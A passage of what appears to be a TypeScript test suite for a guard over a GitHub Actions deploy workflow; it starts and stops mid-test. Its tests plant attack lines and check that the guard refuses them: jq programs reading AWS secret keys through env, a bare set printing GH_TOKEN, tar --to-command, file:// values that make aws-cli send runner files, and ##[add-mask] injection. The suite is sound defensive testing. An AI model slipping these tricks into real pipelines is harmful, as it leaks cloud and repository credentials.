  const EVALUATES = 'evaluates as arithmetic, a subscript, an offset, a name or a prompt only what it sets itself'
  const TOOLS =
    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
  const COMMANDS =
    "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs or that a rule holds to its one line"
  const canonical = (name: string, line: number, rule: string) => `${GUARD}: DPW-10 ${name}, line ${line}: ${rule}`
  const plantAfter = (text: string, anchor: string, added: string) => {
    expect(text).toContain(`${anchor}\n`)
    const planted = text.replace(`${anchor}\n`, `${anchor}\n${added}\n`)
    return { planted, line: planted.split('\n').indexOf(added) + 1 }
  }

  // FETCH-A4-01, COMMANDS-A4-01: a { where a command starts was read as a command named {, which
  // CANONICAL_COMMANDS and SHELL_OWN list, with the group's first command as its tail, so no rule read that
  // command: a touch wrote outside DPW-10's write rule in CLI_FETCH and AWS_CHECK, and a tar whose
  // --to-command ran a program per member hid in the CDK CLI's step. A group's { is now read as the keywords
  // are, and the word after it as the command it is.
  it("reads a group's first command as the command it is (FETCH-A4-01, COMMANDS-A4-01)", () => {
    const touch = 'touch "$RUNNER_TEMP/hearth-plant-marker"'
    for (const [text, anchor] of [
      [CLI_FETCH, 'mkdir "$RUNNER_TEMP/aws-cdk"'],
      [AWS_CHECK, '  [ "$stage" = restore ] && stage=prod'],
    ] as const) {
      const name = text === CLI_FETCH ? 'CLI_FETCH' : 'AWS_CHECK'
      for (const added of [
        `{ ${touch}; }`,
        `{ ${touch};}`,
        `true || { ${touch}; }`,
        `true && { ${touch}; }`,
        `if true; then { ${touch}; }; fi`,
        `! { ${touch}; }`,
        `{ { ${touch}; }; }`,
        `time { ${touch}; }`,
      ]) {
        const plant = plantAfter(text, anchor, added)
        expect(canonicalTextFindings({ [name]: plant.planted }), `${name}: ${added}`).toContain(
          canonical(name, plant.line, COMMANDS),
        )
      }
      // A held tool's flag that runs a program, or a tool off its held line, inside a group.
      for (const added of [
        `{ tar --to-command='touch "$RUNNER_TEMP/x"' -xf "$RUNNER_TEMP/aws-cdk/aws-cdk.tgz" || true; }`,
        `true || { sed -n p "$RUNNER_TEMP/x"; }`,
      ]) {
        const plant = plantAfter(text, anchor, added)
        expect(canonicalTextFindings({ [name]: plant.planted }), `${name}: ${added}`).toContain(
          canonical(name, plant.line, TOOLS),
        )
      }
    }
    expect(shellCommands('{ tar --to-command=X -xf y; }').map(command => command.word)).toEqual(['tar', '}'])
    expect(shellCommands('true || { sed -n p f; }').map(command => command.word)).toEqual(['true', 'sed', '}'])
    expect(canonicalToolLines('{ sed -n p f; }')).toEqual([0])
    expect(canonicalCommandLines('{ touch x; }', new Set())).toEqual([0])
    // A brace expansion as a command's word is still read as the word it is, and refused.
    expect(canonicalCommandLines('{touch,x}', new Set())).toEqual([0])
    // The committed groups (|| { echo …; exit 1; }, and nested ones in AWS_CHECK) still pass.
    expect(canonicalTextFindings()).toEqual([])
  })

  // FLOW-A4-01: a canonical text's evaluations were read in the text alone, but the texts run joined in one
  // shell, so TASKS_OUTPUTS' global revision, set from an AWS answer, was PROBE's $(( revision )), though PROBE
  // gave it 0 first when it was empty, and a subscript in the answer ran a command with the deploy role's
  // session. A name a text evaluates must now be a number wherever any other canonical text or pinned run sets
  // it, and set by no env:. And a value holding arithmetic is read to its word's end, so n=$((0))$y is no number.
  it('evaluates no name another text or run sets to anything but a number (FLOW-A4-01)', () => {
    const tasks = plantAfter(
      TASKS_OUTPUTS,
      `      probe) PROBE_TD="$\{definition##*/}" ;;\n    esac`,
      `    revision=$\{definition#*-$kind:}`,
    ).planted
    const guard = `[ -n "$\{revision:-}" ] || revision=0\n[ "$(( revision ))" -gt 0 ] || { echo 'probe: the Tasks stack names no probe revision' | mask; exit 1; }`
    const probe = PROBE.replace("TARGETS=''\n", `${guard}\nTARGETS=''\n`)
    expect(probe).not.toBe(PROBE)
    const line =
      probe
        .split('\n')
        .indexOf(
          `[ "$(( revision ))" -gt 0 ] || { echo 'probe: the Tasks stack names no probe revision' | mask; exit 1; }`,
        ) + 1
    expect(canonicalTextFindings({ TASKS_OUTPUTS: tasks, PROBE: probe })).toContain(canonical('PROBE', line, EVALUATES))
    // Read with what sets the name elsewhere: another text, a pinned run's own line, an env:.
    const evaluating = `[ -n "$\{revision:-}" ] || revision=0\nseen=$((revision))`
    for (const elsewhere of [
      { texts: [`revision=$\{definition#*-probe:}`], given: new Set<string>() },
      { texts: ['revision=$(get aws ecs describe-services)'], given: new Set<string>() },
      { texts: ['read -r revision <<<"$x"'], given: new Set<string>() },
      { texts: ['for revision in a b; do :; done'], given: new Set<string>() },
      { texts: [], given: new Set(['revision']) },
    ]) {
      expect(outsideEvaluations(evaluating, elsewhere), JSON.stringify(elsewhere)).toEqual([1])
    }
    // Numbers set elsewhere pass, and so does a name no other text sets.
    for (const texts of [['revision=0'], ['revision=$((n + 1))'], ['local revision'], ['other=$1']]) {
      expect(outsideEvaluations(evaluating, { texts, given: new Set() }), texts[0]).toEqual([])
    }
    // A value that holds arithmetic and more is no number.
    expect(outsideEvaluations('y=$1\nn=$((0))$y\necho $((n))')).toEqual([2])
    expect(outsideEvaluations('n=$((0))\necho $((n))')).toEqual([])
    expect(canonicalTextFindings()).toEqual([])
  })

  // YAML-A4-01: DPW-11 read a step as a checkout only when its uses: began actions/checkout, but GitHub's
  // runner splits uses: at / and \ and drops empty segments, so actions\checkout@v5, actions//checkout@v5 and
  // /actions/checkout@v5 checked out with the job's token left behind. The repository is read as the runner
  // reads it.
  it('reads the action a uses: names as GitHub’s runner does (YAML-A4-01)', () => {
    for (const uses of [
      'actions/checkout@v5',
      'Actions/Checkout@v5',
      'actions\\checkout@v5',
      'actions//checkout@v5',
      '/actions/checkout@v5',
      'actions/checkout/@v5',
    ]) {
      expect(actionRepository(uses), uses).toBe('actions/checkout')
    }
    for (const uses of ['actions/checkout-x@v5', './actions/checkout', 'docker://actions/checkout', 'actions@v5']) {
      expect(actionRepository(uses), uses).not.toBe('actions/checkout')
    }
    expect(checkoutFindings(workflows)).toEqual([])
  })
})

describe('Round 9, attack 1: the ways past the allowlist (DPW-07, DPW-10, DPW-14)', () => {
  const TOOLS =
    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
  const COMMANDS =
    "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs or that a rule holds to its one line"
  const STEPS =
    'runs the steps JOB_STEPS names, in order, each by its name with the action it names (a run step none): no step of its own before, between or after them, and none dropped or moved'
  const ENV =
    'sets only the environment variables the workflow uses, each to the value STEP_ENVS names (a job, STAGE alone): no BASH_ENV, PATH or NODE_OPTIONS, and no input from another step, job or context'
  const canonical = (name: string, line: number, rule: string) => `${GUARD}: DPW-10 ${name}, line ${line}: ${rule}`
  const dpw10 = (where: string, rule: string) => `${DEPLOY}: DPW-10 ${where}: ${rule}`
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const plantAfter = (text: string, anchor: string, added: string) => {
    expect(text).toContain(`${anchor}\n`)
    const planted = text.replace(`${anchor}\n`, `${anchor}\n${added}\n`)
    return { planted, line: planted.split('\n').indexOf(added) + 1 }
  }

  // FETCH-A1-01: download-artifact prints, in an action's step that no stop-commands reaches, each artifact's
  // name, which its upload's job chose: the build's code named the image ##[add-mask]true, and the mask that
  // followed dropped services_started, and with it the pipeline's rollback. Before any download, each
  // credentialed job now holds every artifact id it downloads to one number naming an artifact of this run
  // under the name its upload gives it, so the download prints that name alone.
  it("holds each artifact id a credentialed job downloads to its upload's name and this run, before any download (FETCH-A1-01)", () => {
    const jobs = workflowJobs(deployText)
    const jobOf = (id: string) => {
      const found = jobs.find(each => each.id === id)
      if (found === undefined) throw new Error(`no job ${id}`)
      return found
    }
    const uploadOf = (expression: string) => {
      // ${{ needs.<job>.outputs.<output> }} → the job's upload step whose artifact-id that output is.
      const [, from, output] = /^\$\{\{ needs\.([\w-]+)\.outputs\.(\w+) \}\}$/.exec(expression) ?? []
      const step = /^\$\{\{ steps\.([\w-]+)\.outputs\.artifact-id \}\}$/.exec(
        JOB_OUTPUTS[from ?? '']?.[output ?? ''] ?? '',
      )?.[1]
      const upload = parsedSteps(jobOf(from ?? '')).find(each => each.id === step)
      expect(upload?.uses?.startsWith('actions/upload-artifact@'), expression).toBe(true)
      const name = upload?.with.get('name')
      return name ?? (upload?.with.get('archive') === 'false' ? upload.with.get('path')?.split('/').pop() : undefined)
    }
    expect(Object.keys(ARTIFACT_CALLS).sort()).toEqual([
      'nonprod',
      'prod',
      'prod-plan',
      'rollback-nonprod',
      'rollback-prod',
    ])
    for (const [id, calls] of Object.entries(ARTIFACT_CALLS)) {
      const steps = parsedSteps(jobOf(id))
      const at = steps.findIndex(step => step.name === ARTIFACTS_STEP)
      const downloads = steps.flatMap((step, index) =>
        step.uses?.startsWith('actions/download-artifact@') ? [index] : [],
      )
      const credentials = steps.findIndex(step => step.uses?.startsWith('aws-actions/configure-aws-credentials@'))
      expect(at, id).toBeGreaterThanOrEqual(0)
      expect(downloads.length, id).toBeGreaterThan(0)
      expect(downloads.every(index => index > at) && credentials > at, id).toBe(true)
      const step = steps[at]
      expect(step?.run, id).toBe(artifactNamesRun(id))
      expect(step?.run?.startsWith(`${STOP_HEAD}\n`), id).toBe(true)
      const env = Object.fromEntries(step?.env ?? [])
      expect(env, id).toEqual(STEP_ENVS[id]?.[ARTIFACTS_STEP])
      // Each call names the artifact its download fetches by the name its upload gives it.
      const checked = new Map(
        calls.map(call => {
          const [, variable, name] = /^artifact_named "\$(\w+)" (\S+) (?:true|"\$\w+_DUE")$/.exec(call) ?? []
          const expression = env[variable ?? ''] ?? ''
          expect(uploadOf(expression), call).toBe(name)
          return [expression, name] as const
        }),
      )
      for (const index of downloads) {
        expect(checked.has(steps[index]?.with.get('artifact-ids') ?? ''), `${id} (${steps[index]?.name})`).toBe(true)
      }
    }
    // Taken out, moved after a download, or handed another job's output: each refused.
    expect(credentialed(removedStep('nonprod', ARTIFACTS_STEP))).toContain(dpw10('nonprod', STEPS))
    expect(credentialed(movedStep('prod', ARTIFACTS_STEP, 'Check the assembly'))).toContain(dpw10('prod', STEPS))
    const assembly = `          ASSEMBLY_ID: \${{ needs.synth.outputs.assembly }}\n`
    expect(
      credentialed(
        plant(
          assembly,
          `          ASSEMBLY_ID: \${{ needs.synth-previous-nonprod.outputs.assembly }}\n`,
          job('nonprod'),
        ),
      ),
    ).toContain(dpw10(`nonprod (${ARTIFACTS_STEP})`, ENV))
    expect(credentialedCodeFindings(workflows, manifests, lockfile)).toEqual([])
  }, 30_000)

  it('refuses an artifact id that is not one number naming this run’s artifact under its name (FETCH-A1-01)', () => {
    const dir = mkdtempSync(join(tmpdir(), 'hearth-r9-gh-'))
    try {
      // A stand-in gh: records its arguments and answers what the case gives it, or fails as gh does.
      writeFileSync(
        join(dir, 'gh'),
        '#!/bin/bash\nprintf \'%s\\n\' "$@" >>"$GH_CALLS"\n[ -n "$GH_FAILS" ] && exit 1\nprintf \'%s\\n\' "$GH_ANSWER"\n',
        { mode: 0o755 },
      )
      const run = (id: string, name: string, answer: string, fails = '', due = 'true') => {
        const calls = join(dir, `calls-${Math.random().toString(36).slice(2)}`)
        writeFileSync(calls, '')
        const result = spawnSync(
          'bash',
          [
            '-c',
            `set -euo pipefail\n${ARTIFACT_NAMES}\nartifact_named "$1" "$2" "$3"\necho checked`,
            '_',
            id,
            name,
            due,
          ],
          {
            encoding: 'utf8',
            env: {
              PATH: `${dir}:/usr/bin:/bin`,
              REPO: 'owner/repo',
              GITHUB_RUN_ID: '7',
              GH_ANSWER: answer,
              GH_FAILS: fails,
              GH_CALLS: calls,
            },
          },
        )
        return { status: result.status, said: result.stdout.trim(), calls: readFileSync(calls, 'utf8').trim() }
      }
      // This run's artifact under its name passes, by one call to the artifact's own endpoint.
      const passed = run('42', 'assembly', 'assembly 7')
      expect(passed.status).toBe(0)
      expect(passed.said).toBe('checked')
      const program =
        'select(.digest == null or (.digest | test("\\\\Asha256:[0-9a-f]{64}\\\\z"))) | .name + " " + (.workflow_run.id | tostring)'
      expect(passed.calls.split('\n')).toEqual(['api', 'repos/owner/repo/actions/artifacts/42', '--jq', program])
      // The program, run by jq on the artifact's record as gh's --jq runs it: this run's artifact with
      // upload-artifact's digest, or none, reads as its name and run; any other digest reads as nothing, so the
      // check refuses it as not this run's, since download-artifact prints the digest on its line, which the
      // uploading job's code chooses (FETCH-G1-02, round 12).
      const record = (digest: unknown) => JSON.stringify({ id: 42, name: 'assembly', digest, workflow_run: { id: 7 } })
      const answered = (digest: unknown) =>
        execFileSync('jq', ['-r', program], { input: record(digest), encoding: 'utf8' }).trim()
      expect(answered(`sha256:${'0a'.repeat(32)}`)).toBe('assembly 7')
      expect(answered(null)).toBe('assembly 7')
      for (const digest of [
        `sha256:${'0'.repeat(64)}\n##[add-mask]true`,
        `sha256:${'0'.repeat(63)}`,
        `sha256:${'A'.repeat(64)}`,
        `${'0'.repeat(64)}`,
        `sha512:${'0'.repeat(64)}`,
        '##[add-mask]true',
      ]) {
        expect(answered(digest), JSON.stringify(digest)).toBe('')
      }
      // No id is no download (its step's if:), and nothing is asked, only where the call says this run makes no
      // such artifact for the job (false); anywhere else it stops, whatever the word (FLOW-A2-01, round 10).
      expect(run('', 'assembly', '', '', 'false')).toEqual({ status: 0, said: 'checked', calls: '' })
      for (const due of ['true', '', 'False', 'no', '0', ' false']) {
        expect(run('', 'assembly', '', '', due), JSON.stringify(due)).toEqual({
          status: 1,
          said: 'artifacts: this run makes assembly for this job, and its id is empty',
          calls: '',
        })
      }
      // An id is checked whatever the word says.
      expect(run('42', 'assembly', 'assembly 8', '', 'false').status).toBe(1)
      // An id that is not one number is refused before gh is asked.
      for (const id of ['x', '0', '01', '-1', '1 2', '42/../43', '1'.repeat(20), '42\n']) {
        expect(run(id, 'assembly', 'assembly 7'), JSON.stringify(id)).toEqual({
          status: 1,
          said: 'artifacts: an artifact id is not one number',
          calls: '',
        })
      }
      // Another name, another run, an answer with more, or gh failing: refused.
      for (const answer of ['image.tar 7', 'assembly 8', 'assembly', '##[add-mask]true 7', 'assembly 7\nmore']) {
        const refused = run('42', 'assembly', answer)
        expect(refused.status, answer).toBe(1)
        expect(refused.said, answer).toBe("artifacts: artifact 42 is not this run's assembly")
      }
      expect(run('42', 'assembly', 'assembly 7', 'yes').status).not.toBe(0)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // COMMANDS-A1-02: the glue's jq hold found the names a program defines and binds with regexes over its raw
  // text, strings included, so "def include:" in a string let include load a module from the checkout, and
  // "as $ENV" let $ENV through, and the module read the deploy role's session credentials. The program is
  // now read as tokens, a string is never a definition or a binding, and no definition or binding may take a
  // name that reaches outside the program.
  it('reads a glue jq program as tokens, and lets nothing it defines or binds reach outside it (COMMANDS-A1-02)', () => {
    for (const program of [
      'include "docs/read-back" {search: "./"}; "def include:" as $note | tostring | contains("arn:") | not',
      '"as $ENV" | $ENV.AWS_SECRET_ACCESS_KEY | split("")',
      '"def env:" | env.AWS_SECRET_ACCESS_KEY | split("")',
      '{note: "def env: reads the job environment"} | .key = (env.AWS_SESSION_TOKEN | split(""))',
      'def env: .; env',
      'def debug: .; debug',
      '. as $ENV | $ENV',
      'def f($ENV): $ENV; f(1)',
      'import "x" as y; .',
      'input',
      '$__loc__',
      'get_search_list',
      '. | debug(.)',
    ]) {
      expect(jqProgramIsHeld(program, []), program).toBe(false)
    }
    // A key or a string that reads like one of those names is still a key or a string.
    for (const program of [
      'tostring | ascii_downcase | contains("arn:") | not',
      '{env: .a, debug: "include"} | .env',
      '. as $x | $x.input',
      'def f: .; f',
    ]) {
      expect(jqProgramIsHeld(program, []), program).toBe(true)
    }
    // Through deploy.yml: the attack's line in the read-back is refused, beside the pin it breaks.
    const line = `if ! jq -e 'tostring | ascii_downcase | contains("arn:") | not' <<<"$READBACK" >/dev/null; then`
    expect(READ_BACK).toContain(line)
    const planted = line.replace(
      "'tostring",
      `'include "docs/read-back" {search: "./"}; "def include:" as $note | tostring`,
    )
    expect(credentialed(plant(line, planted, job('nonprod')))).toContain(dpw10('nonprod (Read back what runs)', HELD))
    expect(credentialed(workflows)).toEqual([])
  }, 30_000)

  // COMMANDS-A1-01 (minor): a canonical text could set bash's own control variables, EXECIGNORE among them,
  // which hid find from the asset check so the symbolic link test ran nothing. A canonical text now sets none of
  // SHELL_TABLE's bash variables, by any assignment, but IFS before read.
  it("sets none of bash's own variables in a canonical text but IFS before read (COMMANDS-A1-01)", () => {
    const anchor = '  local root dir file path manifests=0 queue stackfiles'
    for (const added of [
      "EXECIGNORE='*/find'",
      'EXECIGNORE+=:/usr/bin/find',
      'local EXECIGNORE=/usr/bin/find',
      'GLOBIGNORE=*',
      'BASH_XTRACEFD=1',
      'PS4=x',
      'HISTFILE=x',
      'PROMPT_COMMAND=x',
      'IFS=x',
      'FUNCNEST=1',
      'BASH_ENV=x',
      'CDPATH=x',
      'x=1; EXECIGNORE=y',
      '(( FUNCNEST = 1 ))',
      "printf -v EXECIGNORE '%s' x",
      'read -r EXECIGNORE <<<"$x"',
      'for GLOBIGNORE in a; do :; done',
      `: "$\{EXECIGNORE:=*/find}"`,
    ]) {
      const { planted, line } = plantAfter(ASSET_CHECK, anchor, `  ${added}`)
      expect(canonicalTextFindings({ ASSET_CHECK: planted }), added).toContain(canonical('ASSET_CHECK', line, COMMANDS))
    }

    // IFS before read, as the texts write it, passes; so does a name that only holds one of those as a part.
    for (const text of [
      `while IFS=$'\\t' read -r a b; do :; done <<<"$x"`,
      'IFS= read -r a <<<"$x"',
      'MY_EXECIGNORE=1',
      'x=$EXECIGNORE',
    ]) {
      expect(canonicalCommandLines(text, new Set()), text).toEqual([])
    }
    expect(canonicalTextFindings()).toEqual([])
  })

  // FLOW-A1-01: a canonical text's aws value could expand any name, so a log group read from a stack output
  // (file://… as the release chose it) reached aws logs get-log-events, which loads such a value from a file on
  // the runner and sends its bytes under the deploy role's session. A value that expands now is one of the
  // words the canonical texts write, each from a name a text checks or builds; a literal names no scheme.
  it('hands aws, in a canonical text, only the values the texts write, and no scheme (FLOW-A1-01)', () => {
    const tasks = plantAfter(
      TASKS_OUTPUTS,
      '  HAS_DATABASE=$(output HasDatabase)',
      '  PROBE_LOGS=$(output ProbeLogGroup)',
    ).planted
    const from = '--log-group-name "/hearth/$STAGE/$kind"'
    expect(ONE_OFF).toContain(from)
    const oneOff = ONE_OFF.replace(from, '--log-group-name "$PROBE_LOGS"')
    const line = oneOff.split('\n').findIndex(each => each.includes('"$PROBE_LOGS"')) + 1
    expect(line).toBeGreaterThan(0)
    expect(canonicalTextFindings({ TASKS_OUTPUTS: tasks, ONE_OFF: oneOff })).toContain(
      canonical('ONE_OFF', line, TOOLS),
    )
    for (const value of [
      '"$group"',
      '"$PROBE_LOGS"',
      `"$\{group}"`,
      '"file://$x"',
      'fileb://x',
      '"https://x"',
      '"x@=y"',
    ]) {
      const aws = `x=$(get aws logs get-log-events --log-group-name ${value} --output json)`
      expect(canonicalToolLines(aws), value).toEqual([0])
    }
    expect(
      canonicalToolLines('x=$(get aws logs get-log-events --log-group-name "/hearth/$STAGE/$kind" --output json)'),
    ).toEqual([])
    for (const [name, text] of Object.entries(CANONICAL_BY_NAME())) expect(canonicalToolLines(text), name).toEqual([])
    expect(canonicalTextFindings()).toEqual([])
  })
})

describe('Round 9, attack 2: the ways past the allowlist (DPW-07, DPW-10)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const READBACK = 'nonprod (Read back what runs)'
  const SETS_INPUT =
    "sets no variable its step's or its job's env: sets or a canonical text in its run sets, no name an aws value reads or the read-back builds one from but by the commands AWS_VALUE_LINES writes (the read-back's from AWS's answers, never a stack's outputs), REGISTRY and RUN only on their own lines and ACCOUNT_ID on none, so no line the guard holds is handed another input"
  const ENV =
    'hands no jq program env or $ENV, reads no /proc file and expands no AWS_ variable, any of which prints the credentials'
  const ARN_CHECK = `if ! jq -e 'tostring | ascii_downcase | contains("arn:") | not' <<<"$READBACK" >/dev/null; then`
  // One line of nonprod's read-back replaced in deploy.yml (the pin's finding comes with it, beside the rule's).
  const inReadBack = (from: string, to: string) => {
    expect(READ_BACK).toContain(from.trim())
    const step = stepText(deployText, 'nonprod', 'Read back what runs')
    return withText(DEPLOY, edited(deployText, step, edited(step, from, to), job('nonprod')))
  }

  // EXPAND-A2-01: the glue's jq hold read a name as an object's key whenever a { or a , stood before it and a :
  // after, whatever bracket was open, so in a slice, .[0, env:1], the start jq evaluates read as a key: env read
  // the job's environment, halt ended the read-back's ARN check, the push's tag check and drill-break's check
  // with status 0, debug printed the input. DPW-07's quoted-env rule let env: through the same way. A name is now
  // a key only straight inside braces.
  it('reads a name as a key only straight inside braces, never as a slice’s start (EXPAND-A2-01)', () => {
    for (const program of [
      '.[0, env:1]',
      '.[0, halt:1] | contains("arn:") | not',
      '.[0, debug:1]',
      '.[0, stderr:1]',
      '.[0, input:1]',
      '{a: .[0, env:1]}',
      '{a: (1, env:2)}',
      '[{a: 1}, env:2]',
    ]) {
      expect(jqProgramIsHeld(program, []), program).toBe(false)
    }
    for (const program of ['{schema: 1, env: $stage}', '{a: [1, 2], env: 3}', '[{env: 1}]', '{a: (1), env: 2}']) {
      expect(jqProgramIsHeld(program, ['stage']), program).toBe(true)
    }
    // Through deploy.yml: the attack's plants in the read-back's ARN check and the push's tag check.
    const env = inReadBack(ARN_CHECK, ARN_CHECK.replace("'tostring", "'.[0, env:1] | tostring"))
    expect(credentialed(env)).toContain(at('DPW-10', READBACK, HELD))
    expect(maskingFindings(env)).toContain(at('DPW-07', READBACK, ENV))
    expect(
      credentialed(inReadBack(ARN_CHECK, ARN_CHECK.replace('contains("arn:")', '.[0, halt:1] | contains("arn:")'))),
    ).toContain(at('DPW-10', READBACK, HELD))
    const tags = `'index($tag) != null'`
    expect(credentialed(plant(tags, `'.[0, halt:1] | index($tag) != null'`, job('nonprod')))).toContain(
      at('DPW-10', 'nonprod (Push the image)', HELD),
    )
    // The read-back's own env: key, straight inside braces, is still a key.
    expect(maskingFindings(workflows)).toEqual([])
    expect(credentialed(workflows)).toEqual([])
  }, 60_000)

  // COMMANDS-A2-02: the glue read "${NAME[@]}" as one word in [ and jq, where bash hands each element on as a
  // word of its own: [ "${TASK_ARNS[@]}" != '' ] read -v and a subscripted name and ran the subscript's command,
  // and jq --arg tasks "${TASK_ARNS[@]}" took the second element as its program. Round 8 closed both for the
  // canonical texts. A word that expands to several now reaches only aws, through run or get.
  it('hands a word that expands to several words to aws alone (COMMANDS-A2-02)', () => {
    const word = (raw: string) => ({ raw, value: undefined, quoted: true, expands: ['A'] })
    const test = SHELL_TABLE.builtins['[']
    expect(test?.([word(`"$\{A[@]}"`), word('!='), word("''"), word(']')])).toBe(false)
    expect(test?.([word(`"$\{#A[@]}"`), word('-gt'), word('0'), word(']')])).toBe(true)
    expect(readShell(`if [ "$\{A[@]}" != '' ]; then\n  echo x\nfi`).refused).toBeDefined()
    expect(readShell(`if [ "$\{#A[@]}" -gt 0 ]; then\n  echo x\nfi`).refused).toBeUndefined()
    // Through deploy.yml, the attack's two plants, and the same word handed to echo.
    const count = `  if [ "$\{#TASK_ARNS[@]}" -gt 0 ]; then`
    const planted = credentialed(inReadBack(count, `  if [ "$\{TASK_ARNS[@]}" != '' ]; then`))
    expect(
      planted.some(each => each.startsWith(`${DEPLOY}: DPW-10 ${READBACK}, line `) && each.endsWith(AS_BASH)),
    ).toBe(true)
    const tasks = "TASKS='[]'\n"
    for (const added of [`LISTED=$(jq -nc --arg tasks "$\{TASK_ARNS[@]}" '$tasks')`, `echo "$\{TASK_ARNS[@]}"`]) {
      expect(credentialed(inReadBack(tasks, `${tasks}            ${added}\n`)), added).toContain(
        at('DPW-10', READBACK, HELD),
      )
    }
    expect(credentialed(workflows)).toEqual([])
  }, 60_000)

  // COMMANDS-A2-01 and FLOW-A2-01: the names an aws value reads were held to their setters only by the read-back's
  // pin, which a change to the run and its pin together always met, so one changed line read the load balancer,
  // a target group or the tasks from the Services stack's outputs, which the release writes, and a file:// output
  // had aws-cli load a runner file and send it, or an output list handed aws --endpoint-url. Each name, and each
  // name the read-back builds one from, is now set only by the commands AWS_VALUE_LINES writes.
  it('sets the names an aws value reads only by the commands the guard writes, whatever the pin holds (COMMANDS-A2-01, FLOW-A2-01)', () => {
    const run = [PREAMBLE, READ_BACK].join('\n')
    expect(ownLinesSetAnInput(run)).toBe(false)
    const outputs = (key: string) =>
      `get aws cloudformation describe-stacks --stack-name "Hearth-$STAGE-Services" --query 'Stacks[0].Outputs[?OutputKey==\`${key}\`].OutputValue | [0]' --output text`
    const lines: ReadonlyArray<readonly [string, string]> = [
      [
        `BALANCER=$(get aws elbv2 describe-load-balancers --names "hearth-$STAGE" --query 'LoadBalancers[0].LoadBalancerArn' --output text)`,
        `BALANCER=$(${outputs('Balancer')})`,
      ],
      [`GROUP_ARN=$(jq -r '.arn' <<<"$GROUP")`, `GROUP_ARN=$(${outputs('TargetGroup')})`],
      [
        `GROUP=$(jq -ec --arg name "hearth-$STAGE-$ROLE" 'first(.[] | select(.name == $name))' <<<"$TARGET_GROUPS")`,
        `GROUP=$(${outputs('TargetGroup')})`,
      ],
      [
        `ARNS=$(get aws ecs list-tasks --cluster "hearth-$STAGE" --service-name "hearth-$STAGE-$ROLE" --desired-status RUNNING --query 'taskArns' --output json)`,
        `ARNS=$(get aws cloudformation describe-stacks --stack-name "Hearth-$STAGE-Services" --query 'Stacks[0].Outputs[].OutputValue' --output json)`,
      ],
      [`mapfile -t TASK_ARNS < <(jq -r '.[]' <<<"$ARNS")`, `mapfile -t TASK_ARNS < <(jq -r '.[]' <<<"$STACK")`],
      ['for ROLE in api realtime worker; do', 'for ROLE in api realtime worker -v; do'],
    ]
    for (const [from, to] of lines) {
      expect(run, from).toContain(from)
      // The run changed as its pin would change with it: still this rule's finding.
      expect(ownLinesSetAnInput(run.replace(from, to)), to).toBe(true)
    }
    // Through deploy.yml, the names the read-back builds a value from, which no rule held before.
    for (const [from, to] of lines.slice(2, 5)) {
      expect(credentialed(inReadBack(from, to)), to).toContain(at('DPW-10', READBACK, SETS_INPUT))
    }
    expect(credentialed(workflows)).toEqual([])
  }, 60_000)
})

describe('Round 9, attack 3: the ways past the allowlist (DPW-07, DPW-10)', () => {
  const TRACE =
    'runs no set -x, set -o xtrace, env, printenv, export -p or declare -p, and no set, declare, export, local or readonly given no name'
  const COMMANDS =
    "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs or that a rule holds to its one line"
  const EXPANDS =
    "expands only a name a canonical text sets, one its step's or job's env: gives from no secret or token (but ASSEMBLY_FOLDER, which only an asset check's own calls read), the one-offs' TOKEN, the assembly's folder, prod-plan's diff file, or the runner's outputs, summary, folder, run ids, address and commit, so no canonical text prints the OIDC request token or another credential its job holds"
  const canonical = (name: string, line: number, rule: string, id = 'DPW-10') =>
    `${GUARD}: ${id} ${name}, line ${line}: ${rule}`
  const plantAfter = (text: string, anchor: string, added: string) => {
    expect(text).toContain(`${anchor}\n`)
    const planted = text.replace(`${anchor}\n`, `${anchor}\n${added}\n`)
    return { planted, line: planted.split('\n').indexOf(added) + 1 }
  }
  const refusedAs = (findings: readonly string[], where: string) =>
    findings.some(each => each.startsWith(`${DEPLOY}: ${where}, line `) && each.endsWith(AS_BASH))

  // EXPAND-A3-01: bash takes a redirection before a command's word as that command's, so 2>/dev/null set ran a
  // bare set, which prints every variable, GH_TOKEN among them, in the gate and prod-gate. The table read the
  // descriptor as the command's word (a command named 2, given set), and DPW-07's bare-set rule fired only on a
  // set with nothing before it. The table now reads a redirection only after a command's word, and the rule reads
  // a set, env, declare, typeset or export given no word whatever stands before it.
  it('reads a redirection only after a command’s word, and a bare set whatever stands before it (EXPAND-A3-01)', () => {
    for (const line of [
      '2>/dev/null set',
      '0</dev/null set',
      '1>>"$GITHUB_STEP_SUMMARY" set',
      '2>/dev/null echo x',
      '>/dev/null echo x',
      'X=1 2>/dev/null echo x',
      'X="$(2>/dev/null echo x)"',
    ]) {
      expect(readShell(line).refused?.what, line).toBe("a redirection before a command's word")
    }
    for (const line of ['echo x 2>/dev/null', 'echo x >>"$GITHUB_STEP_SUMMARY"', 'X="$(echo x 2>/dev/null)"']) {
      expect(readShell(line).refused, line).toBeUndefined()
    }
    // Through deploy.yml: the attack's plants in the gate's records step, each refused by the table and by the
    // bare-set rule in its own right; and the same rule over an assignment before set.
    const records = 'gate (The release, migration and restore records)'
    for (const added of ['2>/dev/null set', '0</dev/null set', '1>>"$GITHUB_STEP_SUMMARY" set', 'X=1 set']) {
      const planted = maskingFindings(
        addedBefore(
          'gate',
          'The release, migration and restore records',
          '          for environment in nonprod prod; do\n',
          `          ${added}\n`,
        ),
      )
